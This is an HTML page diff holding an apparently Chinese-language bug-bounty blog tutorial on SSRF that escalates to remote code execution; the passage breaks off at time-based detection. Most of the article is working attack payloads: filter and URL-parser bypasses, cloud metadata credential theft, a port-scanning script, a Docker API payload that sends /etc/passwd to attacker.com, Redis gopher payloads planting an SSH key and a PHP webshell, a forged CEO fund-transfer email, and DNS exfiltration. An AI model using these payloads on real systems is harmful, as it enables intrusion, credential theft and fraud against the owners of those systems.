@@ -1,0 +1,865 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/admin.jpg">
+  <link rel="icon" href="/img/admin.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="xiaobite">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="SSRF — 从探测到 RCE信息收集：寻找 SSRF 入口明显的目标（所有人都会测试的）12345&#x2F;api&#x2F;fetch?url&#x3D;&#x2F;proxy?url&#x3D;&#x2F;download?file&#x3D;&#x2F;image?src&#x3D;&#x2F;screenshot?url&#x3D;  存在严重的 SSRF 文档处理器 &amp; 转换器  PDF 生成器（HTML 转 PDF） 图片处理器（SVG，尤其是带有 XXE 的） Office 文档">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSRF — 从探测到 RCE">
+<meta property="og:url" content="https://xiaobite-hacker.github.io/2026/04/23/SSRF-%E4%BB%8E%E6%8E%A2%E6%B5%8B%E5%88%B0RCE/index.html">
+<meta property="og:site_name" content="xiaobite">
+<meta property="og:description" content="SSRF — 从探测到 RCE信息收集：寻找 SSRF 入口明显的目标（所有人都会测试的）12345&#x2F;api&#x2F;fetch?url&#x3D;&#x2F;proxy?url&#x3D;&#x2F;download?file&#x3D;&#x2F;image?src&#x3D;&#x2F;screenshot?url&#x3D;  存在严重的 SSRF 文档处理器 &amp; 转换器  PDF 生成器（HTML 转 PDF） 图片处理器（SVG，尤其是带有 XXE 的） Office 文档">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-04-23T08:30:00.000Z">
+<meta property="article:modified_time" content="2026-05-03T10:11:59.753Z">
+<meta property="article:author" content="xiaobite">
+<meta property="article:tag" content="SSRF漏洞">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>SSRF — 从探测到 RCE - xiaobite</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"xiaobite-hacker.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>xiaobite</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/prompt/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>prompt</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="SSRF — 从探测到 RCE"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-04-23 16:30" pubdate>
+          2026年4月23日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          29 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">SSRF — 从探测到 RCE</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="SSRF-—-从探测到-RCE"><a href="#SSRF-—-从探测到-RCE" class="headerlink" title="SSRF — 从探测到 RCE"></a>SSRF — 从探测到 RCE</h1><h3 id="信息收集：寻找-SSRF-入口"><a href="#信息收集：寻找-SSRF-入口" class="headerlink" title="信息收集：寻找 SSRF 入口"></a>信息收集：寻找 SSRF 入口</h3><h3 id="明显的目标（所有人都会测试的）"><a href="#明显的目标（所有人都会测试的）" class="headerlink" title="明显的目标（所有人都会测试的）"></a>明显的目标（所有人都会测试的）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">/api/fetch?url=<br>/proxy?url=<br>/download?file=<br>/image?src=<br>/screenshot?url=<br></code></pre></td></tr></table></figure>
+
+<h3 id="存在严重的-SSRF"><a href="#存在严重的-SSRF" class="headerlink" title="存在严重的 SSRF"></a>存在严重的 SSRF</h3><ol>
+<li><p>文档处理器 &amp; 转换器</p>
+<ul>
+<li>PDF 生成器（HTML 转 PDF）</li>
+<li>图片处理器（SVG，尤其是带有 XXE 的）</li>
+<li>Office 文档导入（DOCX、XLSX）</li>
+<li>支持远程图片的 Markdown 渲染器</li>
+</ul>
+</li>
+<li><p>Webhooks &amp; 集成</p>
+<ul>
+<li>Slack 通知</li>
+<li>Discord webhooks</li>
+<li>自定义集成端点</li>
+<li>OAuth 回调（redirect_uri）</li>
+<li>SAML&#x2F;SSO 配置</li>
+</ul>
+</li>
+<li><p>隐藏的 API 参数<br>大多数应用都有未文档化的参数。我使用：</p>
+</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用常见 SSRF 参数进行参数模糊测试</span><br>ffuf -w ssrf-params.txt -u <span class="hljs-string">&quot;https://target.com/api/endpoint?FUZZ=http://burp-collab&quot;</span><br><br><span class="hljs-comment"># 我的自定义字典包括：</span><br><span class="hljs-comment"># url, uri, path, dest, destination, target, source, src,</span><br><span class="hljs-comment"># redirect, callback, return, return_url, next, continue,</span><br><span class="hljs-comment"># proxy, feed, rss, xml, file, document, link, reference</span><br></code></pre></td></tr></table></figure>
+
+<p>Tip: 留意文件上传功能中”从 URL 获取”作为本地上传替代方案的选项。</p>
+<h3 id="SSRF-绕过技术"><a href="#SSRF-绕过技术" class="headerlink" title="SSRF 绕过技术"></a>SSRF 绕过技术</h3><h3 id="1-URL-解析器混淆"><a href="#1-URL-解析器混淆" class="headerlink" title="1. URL 解析器混淆"></a>1. URL 解析器混淆</h3><p>不同的解析器对 URL 的解读方式不同。利用这一点。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Localhost 绕过变体</span><br>http://localhost<br>http://127.0.0.1<br>http://127.1<br>http://0<br>http://0.0.0.0<br>http://[::1]<br>http://[::]<br><br><span class="hljs-comment"># 十进制/八进制/十六进制编码</span><br>http://2130706433        <span class="hljs-comment"># 127.0.0.1 的十进制表示</span><br>http://0x7f000001        <span class="hljs-comment"># 127.0.0.1 的十六进制表示</span><br>http://017700000001       <span class="hljs-comment"># 127.0.0.1 的八进制表示</span><br><br><span class="hljs-comment"># DNS 重绑定</span><br>http://localtest.me      <span class="hljs-comment"># 解析到 127.0.0.1</span><br>http://customer1.app.localhost.my-domain.com<br><br><span class="hljs-comment"># CNAME 技巧 — 将你的域名指向内部 IP</span><br>http://internal.attacker.com  <span class="hljs-comment"># CNAME -&gt; 169.254.169.254</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="2-协议走私"><a href="#2-协议走私" class="headerlink" title="2. 协议走私"></a>2. 协议走私</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 不同协议，不同影响</span><br>file:///etc/passwd<br>dict://localhost:6379/INFO<br>gopher://localhost:6379/_INFO<br>ftp://localhost/<br>tftp://localhost/<br>ldap://localhost/<br>jar:http://attacker.com!/<br><br><span class="hljs-comment"># Gopher 协议：这是你在 SSRF 中的瑞士军刀。</span><br><span class="hljs-comment"># 通过 Gopher 构造 POST 请求</span><br><span class="hljs-comment"># 示例：发送 Redis 命令</span><br>gopher://localhost:6379/_SET%20key%20value<br><br><span class="hljs-comment"># 示例：SMTP 利用</span><br>gopher://localhost:25/_MAIL%20FROM:attacker@evil.com%0ARCPT%20TO:victim@target.com<br></code></pre></td></tr></table></figure>
+
+<h3 id="3-绕过黑名单过滤器"><a href="#3-绕过黑名单过滤器" class="headerlink" title="3. 绕过黑名单过滤器"></a>3. 绕过黑名单过滤器</h3><p>当它们屏蔽 “localhost”、”127”、”169.254” 时：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用替代表示</span><br>http://①②⑦.⓪.⓪.①         <span class="hljs-comment"># Unicode 数字</span><br>http://127。0。0。1          <span class="hljs-comment"># Unicode 点号</span><br>http://127.0.0.1.nip.io<br>http://127.0.0.1.xip.io<br>http://spoofed.burpcollaborator.net<br><br><span class="hljs-comment"># 域名拼接</span><br>http://127.0.0.1.trusted-domain.com<br>http://trusted-domain.com@127.0.0.1<br>http://127.0.0.1#trusted-domain.com<br><br><span class="hljs-comment"># Open Redirect 链式利用</span><br>http://trusted-domain.com/redirect?url=http://169.254.169.254<br><br><span class="hljs-comment"># 当它们校验 URL 以它们的域名为开头时：</span><br>http://trusted.com@attacker.com<br>http://trusted.com.attacker.com<br>http://attacker.com?trusted.com<br>http://attacker.com#trusted.com<br></code></pre></td></tr></table></figure>
+
+<h3 id="4-DNS-锁定-vs-DNS-重绑定"><a href="#4-DNS-锁定-vs-DNS-重绑定" class="headerlink" title="4. DNS 锁定 vs DNS 重绑定"></a>4. DNS 锁定 vs DNS 重绑定</h3><p>检查时间与使用时间的不一致（TOCTOU）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 设置 DNS 服务器，使其返回不同结果：</span><br><span class="hljs-comment"># 第一次请求：返回允许的 IP (1.2.3.4)</span><br><span class="hljs-comment"># 第二次请求：返回内部 IP (127.0.0.1)</span><br><br><span class="hljs-comment"># 使用低 TTL（1 秒）</span><br>target.attacker.com A 1.2.3.4 (TTL: 1)<br>target.attacker.com A 127.0.0.1 (TTL: 1)<br></code></pre></td></tr></table></figure>
+<p>工具：singularity、rbndr、自定义 DNS 服务器</p>
+<h3 id="利用链：从探测到毁灭性打击"><a href="#利用链：从探测到毁灭性打击" class="headerlink" title="利用链：从探测到毁灭性打击"></a>利用链：从探测到毁灭性打击</h3><h3 id="1：云元数据-→-账户接管"><a href="#1：云元数据-→-账户接管" class="headerlink" title="1：云元数据 → 账户接管"></a>1：云元数据 → 账户接管</h3><p>AWS EC2 实例元数据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 基本枚举</span><br>http://169.254.169.254/latest/meta-data/<br>http://169.254.169.254/latest/meta-data/iam/security-credentials/<br>http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]<br><br><span class="hljs-comment"># IMDSv2 绕过（需要 token，但很多仍在使用 v1）</span><br><span class="hljs-comment"># 如果强制使用 v2，寻找：</span><br><span class="hljs-comment"># - 服务端 PDF 生成器</span><br><span class="hljs-comment"># - 服务端浏览器（Puppeteer、Selenium）</span><br><span class="hljs-comment"># 这些可以发送 PUT 请求！</span><br></code></pre></td></tr></table></figure>
+
+<p>攻击路径：</p>
+<ol>
+<li>在发起服务端请求的功能中发现 SSRF</li>
+<li>访问 AWS 元数据端点</li>
+<li>从响应中提取 IAM role 凭证</li>
+<li>使用凭证枚举 AWS 资源</li>
+<li>展示对敏感数据的未授权访问</li>
+<li>附上完整的影响文档进行报告</li>
+</ol>
+<p>Azure 实例元数据</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">169.254.169.254</span>/metadata/instance?api-version=<span class="hljs-number">2021</span>-<span class="hljs-number">02</span>-<span class="hljs-number">01</span><br><span class="hljs-attribute">http</span>://<span class="hljs-number">169.254.169.254</span>/metadata/identity/oauth2/token?api-version=<span class="hljs-number">2018</span>-<span class="hljs-number">02</span>-<span class="hljs-number">01</span>&amp;resource=https://management.azure.com/<br></code></pre></td></tr></table></figure>
+
+<p>Google Cloud 元数据</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//m</span>etadata.google.internal<span class="hljs-regexp">/computeMetadata/</span>v1/<br>http:<span class="hljs-regexp">//m</span>etadata.google.internal<span class="hljs-regexp">/computeMetadata/</span>v1<span class="hljs-regexp">/instance/</span>service-accounts<span class="hljs-regexp">/default/</span>token<br><br><span class="hljs-comment"># 需要 header: Metadata-Flavor: Google</span><br><span class="hljs-comment"># 使用 PDF 生成器发送自定义 headers！</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="2：内部服务枚举-→-RCE"><a href="#2：内部服务枚举-→-RCE" class="headerlink" title="2：内部服务枚举 → RCE"></a>2：内部服务枚举 → RCE</h3><p>端口扫描</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 基于响应时间的端口扫描</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">65535</span>):<br>    start = time.time()<br>    <span class="hljs-keyword">try</span>:<br>        requests.get(<span class="hljs-string">f&quot;http://target.com/proxy?url=http://10.0.0.5:<span class="hljs-subst">&#123;port&#125;</span>&quot;</span>, timeout=<span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>    elapsed = time.time() - start<br><br>    <span class="hljs-keyword">if</span> elapsed &lt; <span class="hljs-number">1.5</span>:  <span class="hljs-comment"># 快速响应 = 端口开放</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Port <span class="hljs-subst">&#123;port&#125;</span> open&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>通过响应体进行服务指纹识别</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Redis</span><br>gopher://localhost:6379/_INFO<br><br><span class="hljs-comment"># Memcached</span><br>gopher://localhost:11211/_stats<br><br><span class="hljs-comment"># Elasticsearch</span><br>http://localhost:9200/_cluster/health<br><br><span class="hljs-comment"># Docker API (RCE!)</span><br>http://localhost:2375/containers/json<br>http://localhost:2375/containers/create<br><br><span class="hljs-comment"># Kubernetes</span><br>http://localhost:8001/api/<br>http://localhost:10250/pods<br></code></pre></td></tr></table></figure>
+
+<h3 id="3：Docker-API-RCE"><a href="#3：Docker-API-RCE" class="headerlink" title="3：Docker API RCE"></a>3：Docker API RCE</h3><p>当你通过 SSRF 发现暴露的 Docker API 时：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs json">POST /containers/create<br><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;Image&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;alpine&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;Cmd&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;/bin/sh&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;-c&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;curl http://attacker.com/$(cat /host/etc/passwd | base64)&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;HostConfig&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;Binds&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;/:/host&quot;</span><span class="hljs-punctuation">]</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><br>POST /containers/<span class="hljs-punctuation">&#123;</span>id<span class="hljs-punctuation">&#125;</span>/start<br></code></pre></td></tr></table></figure>
+
+<p>通过 Gopher（如果你能发送原始 POST）：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gopher</span>://localhost:<span class="hljs-number">2375</span>/_POST%<span class="hljs-number">20</span>/containers/create%<span class="hljs-number">20</span>HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>AHost:%<span class="hljs-number">20</span>localhost:<span class="hljs-number">2375</span>%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>AContent-Type:%<span class="hljs-number">20</span>application/json%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>AContent-Length:%<span class="hljs-number">20</span>[LENGTH]%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>D%<span class="hljs-number">0</span>A&#123;JSON_PAYLOAD&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="4：Redis-利用"><a href="#4：Redis-利用" class="headerlink" title="4：Redis 利用"></a>4：Redis 利用</h3><p>通过 Gopher 协议：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 写入 SSH 密钥</span><br>gopher://localhost:6379/_*1%0d%0a<span class="hljs-variable">$8</span>%0d%0aflushall%0d%0a*3%0d%0a<span class="hljs-variable">$3</span>%0d%0aset%0d%0a<span class="hljs-variable">$1</span>%0d%0a1%0d%0a<span class="hljs-variable">$64</span>%0d%0a%0d%0a%0a%0assh-rsa AAAA...KEY...%0a%0a%0d%0a*4%0d%0a<span class="hljs-variable">$6</span>%0d%0aconfig%0d%0a<span class="hljs-variable">$3</span>%0d%0aset%0d%0a<span class="hljs-variable">$3</span>%0d%0adir%0d%0a<span class="hljs-variable">$16</span>%0d%0a/root/.ssh%0d%0a*4%0d%0a<span class="hljs-variable">$6</span>%0d%0aconfig%0d%0a<span class="hljs-variable">$3</span>%0d%0aset%0d%0a<span class="hljs-variable">$10</span>%0d%0adbfilename%0d%0a<span class="hljs-variable">$15</span>%0d%0aauthorized_keys%0d%0a*1%0d%0a<span class="hljs-variable">$4</span>%0d%0asave%0d%0aquit%0d%0a<br><br><span class="hljs-comment"># 写入 webshell</span><br>gopher://localhost:6379/_*3%0d%0a<span class="hljs-variable">$3</span>%0d%0aset%0d%0a<span class="hljs-variable">$1</span>%0d%0a1%0d%0a<span class="hljs-variable">$64</span>%0d%0a&lt;?php system(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); ?&gt;%0d%0a*4%0d%0a<span class="hljs-variable">$6</span>%0d%0aconfig%0d%0a<span class="hljs-variable">$3</span>%0d%0aset%0d%0a<span class="hljs-variable">$3</span>%0d%0adir%0d%0a<span class="hljs-variable">$13</span>%0d%0a/var/www/html%0d%0a*4%0d%0a<span class="hljs-variable">$6</span>%0d%0aconfig%0d%0a<span class="hljs-variable">$3</span>%0d%0aset%0d%0a<span class="hljs-variable">$10</span>%0d%0adbfilename%0d%0a<span class="hljs-variable">$9</span>%0d%0ashell.php%0d%0a*1%0d%0a<span class="hljs-variable">$4</span>%0d%0asave%0d%0a<br></code></pre></td></tr></table></figure>
+
+<h3 id="5：SMTP-注入-→-邮件伪造"><a href="#5：SMTP-注入-→-邮件伪造" class="headerlink" title="5：SMTP 注入 → 邮件伪造"></a>5：SMTP 注入 → 邮件伪造</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 通过 Gopher 访问内部 SMTP</span><br>gopher://localhost:25/_EHLO%20attacker.com%0AMAIL%20FROM:&lt;%3Cceo@company.com%3E&gt;%0ARCPT%20TO:&lt;%3Cvictim@target.com%3E&gt;%0ADATA%0AFrom:%20CEO%20&lt;ceo@company.com&gt;%0ATo:%20victim@target.com%0ASubject:%20Urgent%0A%0ATransfer%20funds%20immediately.%0A.%0AQUIT<br></code></pre></td></tr></table></figure>
+
+<h3 id="严重级别的利用"><a href="#严重级别的利用" class="headerlink" title="严重级别的利用"></a>严重级别的利用</h3><h3 id="Blind-SSRF-检测"><a href="#Blind-SSRF-检测" class="headerlink" title="Blind SSRF 检测"></a>Blind SSRF 检测</h3><p>当你无法获得响应时，使用带外（out-of-band）技术：</p>
+<p>DNS 数据外传：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 在 URL 参数中</span><br>http://$(<span class="hljs-built_in">whoami</span>).burpcollaborator.net<br><br><span class="hljs-comment"># 在 SVG 中（适用于图片处理器）</span><br>&lt;svg xmlns=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;<br>  &lt;image href=<span class="hljs-string">&quot;http://<span class="hljs-subst">$(whoami)</span>.attacker.com/x.jpg&quot;</span>/&gt;<br>&lt;/svg&gt;<br></code></pre></td></tr></table></figure>
+
+<p>基于时间的检测：</p>
